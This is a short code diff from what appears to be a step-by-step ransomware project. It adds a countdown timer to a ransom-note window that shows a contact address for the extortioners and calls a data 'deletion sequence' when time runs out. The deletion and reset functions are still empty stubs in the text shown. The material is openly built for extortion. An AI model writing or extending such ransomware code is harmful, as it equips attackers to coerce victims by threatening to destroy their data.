@@ -1017,6 +1017,23 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         except (FileNotFoundError, ValueError):
             self.reset_timer()
 
+    # Step 49: Function to updating the timer
+    def update_timer(self):
+        remainingTime = self.closingTime - datetime.now()
+
+        # if time remains, show remaining time
+        if remainingTime.total_seconds() > 0:
+            self.timerLabel.config(text=f"Time remaining: {str(remainingTime).split('.')[0]}")
+            self.timerUpdateId = self.after(1000, self.update_timer)
+
+        # Else, time is up, show Your Time is up! in the Label and begin a deletion sequence
+        else:
+            self.timerLabel.config(text="Time is UP")
+            self.begin_deletion_sequence()
+
+
+    def reset_timer(self):
+        pass
 
     def delete_timer_and_machine_id_files(self):
         pass
@@ -1027,11 +1044,6 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
     def begin_deletion_sequence(self):
         pass
 
-    def update_timer(self):
-        pass
-
-    def reset_timer(self):
-        pass
 
 
 if __name__ == "__main__":
